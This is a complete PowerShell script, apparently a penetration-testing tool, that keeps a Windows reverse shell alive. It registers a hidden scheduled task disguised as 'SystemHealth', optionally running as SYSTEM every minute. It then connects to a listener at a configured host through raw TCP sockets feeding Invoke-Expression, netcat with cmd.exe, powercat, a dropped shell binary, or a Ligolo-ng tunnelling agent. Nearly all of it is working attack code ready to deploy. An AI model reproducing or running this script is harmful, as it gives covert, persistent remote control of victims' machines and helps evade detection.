# ==============================================================================
# REVERSE SHELL PERSISTENCE SCRIPT (Windows / PowerShell)
# ==============================================================================
# Designed to run as a scheduled task every minute. Tries multiple methods
# until one succeeds. If a connection already exists, exits cleanly.
#
# SETUP - create scheduled task (run from cmd.exe or PowerShell as current user):
#
#   schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File c:\temp\revshell.ps1" /sc minute /mo 1 /f
#
# To run as SYSTEM (requires elevated shell):
#   schtasks /create /tn "SystemHealth" /tr "powershell -ep bypass -WindowStyle Hidden -File c:\temp\revshell.ps1" /sc minute /mo 1 /ru SYSTEM /f
#
# To delete the task during cleanup:
#   schtasks /delete /tn "SystemHealth" /f
# ==============================================================================

# ==============================================================================
# CONFIGURATION - edit before deploying
# ==============================================================================
$LHOST = "10.10.10.10"
$LPORT = 4444
$WORKDIR = "C:\Temp"
$LIGOLO_PORT = 11601
$LIGOLO_PORT_FALLBACK = 443

# ==============================================================================
# WORKING DIRECTORY
# All binary lookups resolve from here
# ==============================================================================
if (Test-Path $WORKDIR) {
    Set-Location $WORKDIR
}

# ==============================================================================
# CHECK FOR EXISTING CONNECTION
# Avoids spawning duplicate shells to the same listener
# ==============================================================================
try {
    $existing = Get-NetTCPConnection -RemoteAddress $LHOST -RemotePort $LPORT -ErrorAction SilentlyContinue
    if ($existing) { exit 0 }
} catch {}

# ==============================================================================
# CONNECTION METHODS
# Ordered from most reliable to least. Each function exits the script on success.
# ==============================================================================

# Method 1: PowerShell TCP socket (pure PS, no dependencies)
function Try-PSSocket {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
        $sendback = ($([System.Text.Encoding]::ASCII.GetString($bytes, 0, $stream.Read($bytes, 0, $bytes.Length))))
        $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
        while ($true) {
            [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
            $bytesRead = $stream.Read($bytes, 0, $bytes.Length)
            if ($bytesRead -eq 0) { break }
            $data = ([text.encoding]::ASCII).GetString($bytes, 0, $bytesRead)
            $sendback = (Invoke-Expression -Command $data 2>&1 | Out-String)
            $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
            $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
            $stream.Write($sendbyte, 0, $sendbyte.Length)
            $stream.Flush()
        }
        $client.Close()
        exit 0
    } catch {
        return $false
    }
}

# Method 2: PowerShell StreamReader/Writer (more stable on some targets)
function Try-PSSocket2 {
    try {
        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
        $stream = $client.GetStream()
        $writer = New-Object System.IO.StreamWriter($stream)
        $reader = New-Object System.IO.StreamReader($stream)
        $writer.AutoFlush = $true
        while ($true) {
            $cmd = $reader.ReadLine()
            if ($null -eq $cmd -or $cmd -eq "exit") { break }
            try {
                $output = Invoke-Expression $cmd 2>&1 | Out-String
            } catch {
                $output = $_.Exception.Message
            }
            $writer.WriteLine($output)
        }
        $client.Close()
        exit 0
    } catch {
        return $false
    }
}

# Method 3: Netcat (nc.exe or nc64.exe from WORKDIR or common paths)
function Try-Netcat {
    $ncPaths = @(
        "$WORKDIR\nc.exe",
        "$WORKDIR\nc64.exe",
        "C:\Windows\Temp\nc.exe",
        "C:\Windows\Temp\nc64.exe",
        "C:\nc.exe",
        "C:\nc64.exe",
        "C:\ProgramData\nc.exe",
        "C:\ProgramData\nc64.exe"
    )
    foreach ($ncPath in $ncPaths) {
        if (Test-Path $ncPath) {
            try {
                & $ncPath -e cmd.exe $LHOST $LPORT 2>$null
                exit 0
            } catch {
                continue
            }
        }
    }
    return $false
}

# Method 4: PowerCat (if powercat.ps1 has been uploaded or imported on target)
function Try-PowerCat {
    try {
        if (Get-Command powercat -ErrorAction SilentlyContinue) {
            powercat -c $LHOST -p $LPORT -e cmd.exe
            exit 0
        }
        $pcPaths = @(
            "$WORKDIR\powercat.ps1",
            "C:\Windows\Temp\powercat.ps1"
        )
        foreach ($pcPath in $pcPaths) {
            if (Test-Path $pcPath) {
                . $pcPath
                powercat -c $LHOST -p $LPORT -e cmd.exe
                exit 0
            }
        }
    } catch {
        return $false
    }
}

# Method 5: Custom shell binary (msfvenom payload or similar)
function Try-ShellBinary {
    $shellPaths = @(
        "$WORKDIR\shell.exe",
        "C:\Windows\Temp\shell.exe",
        "C:\ProgramData\shell.exe"
    )
    foreach ($shellPath in $shellPaths) {
        if (Test-Path $shellPath) {
            try {
                & $shellPath
                exit 0
            } catch {
                continue
            }
        }
    }
    return $false
}

# Method 6: Ligolo-ng agent
# Attempts primary port (11601) then falls back to 443.
# Skips reachability pre-check - agent handles connection failure itself.
# Logs to C:\Temp\agent_launch.log for triage.
function Try-Ligolo {
    $agentPath = "$WORKDIR\agent.exe"
    if (-not (Test-Path $agentPath)) {
        "$(Get-Date) - agent.exe not found at $agentPath" | Out-File "$WORKDIR\agent_launch.log" -Append
        return
    }

    # Check if agent is already running
    $running = Get-Process -Name "agent" -ErrorAction SilentlyContinue
    if ($running) {
        "$(Get-Date) - agent.exe already running (PID $($running.Id)), skipping" | Out-File "$WORKDIR\agent_launch.log" -Append
        return
    }

    $portsToTry = @($LIGOLO_PORT, $LIGOLO_PORT_FALLBACK)
    foreach ($port in $portsToTry) {
        try {
            "$(Get-Date) - Attempting agent.exe on port $port" | Out-File "$WORKDIR\agent_launch.log" -Append
            $proc = Start-Process -FilePath $agentPath `
                -ArgumentList "-connect ${LHOST}:${port} -ignore-cert" `
                -WindowStyle Hidden `
                -PassThru `
                -ErrorAction Stop
            Start-Sleep -Seconds 3
            # Check if process is still alive after 3 seconds (didn't crash immediately)
            if (-not $proc.HasExited) {
                "$(Get-Date) - agent.exe launched successfully on port $port (PID $($proc.Id))" | Out-File "$WORKDIR\agent_launch.log" -Append
                return
            } else {
                "$(Get-Date) - agent.exe exited immediately on port $port (exit code $($proc.ExitCode))" | Out-File "$WORKDIR\agent_launch.log" -Append
            }
        } catch {
            "$(Get-Date) - Exception launching agent.exe on port $port`: $_" | Out-File "$WORKDIR\agent_launch.log" -Append
            continue
        }
    }
}

# ==============================================================================
# MAIN EXECUTION
# ==============================================================================
Try-PSSocket
Try-PSSocket2
Try-Netcat
Try-PowerCat
Try-ShellBinary
Try-Ligolo

# All methods failed - exit cleanly
exit 0
